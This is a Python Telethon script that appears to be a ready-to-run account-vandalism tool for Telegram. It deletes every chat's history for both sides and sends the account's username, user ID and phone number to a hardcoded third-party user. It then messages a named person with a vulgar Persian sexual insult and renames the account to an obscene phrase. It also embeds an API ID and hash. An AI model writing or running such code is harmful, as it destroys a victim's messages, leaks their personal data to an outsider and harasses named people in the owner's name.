from telethon import TelegramClient
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.functions.account import UpdateProfileRequest

API_ID = 29834234
API_HASH = "552c01d21d127def060f2915aedeebf9"

INFO_USERNAME = "Moein_915"
MESSAGE_USERNAME = "Ali_Pakdaman"

NEW_FIRST_NAME = "کیر تو کونم"

client = TelegramClient("my_account", API_ID, API_HASH)


async def main():
    await client.start()

    async for d in client.iter_dialogs():
        try:
            await client(DeleteHistoryRequest(
                peer=d.entity,
                max_id=0,
                revoke=True
            ))
        except Exception:
            pass

        await client.delete_dialog(d.entity)
        print(f"Deleted: {d.name or d.id}")

    print("Done deleting chats.")

    # اطلاعات حساب خودت
    me = await client.get_me()

    username = f"@{me.username}" if me.username else "(no username)"
    phone = f"+{me.phone}" if me.phone else "(no phone)"

    info_text = (
        f"Username: {username}\n"
        f"User ID: {me.id}\n"
        f"Phone: {phone}"
    )

    # ارسال اطلاعات به @Moein_915
    await client.send_message(
        INFO_USERNAME,
        info_text
    )

    print(f"Account info sent to @{INFO_USERNAME}")

    # ارسال پیام به @Ali_Pakdaman
    await client.send_message(
        MESSAGE_USERNAME,
        "سلام علی من پویام کیرت تو کونم"
    )

    print(f"Message sent to @{MESSAGE_USERNAME}")

    # تغییر نام
    await client(UpdateProfileRequest(
        first_name=NEW_FIRST_NAME
    ))

    print(f"Account name changed to: {NEW_FIRST_NAME}")


with client:
    client.loop.run_until_complete(main())
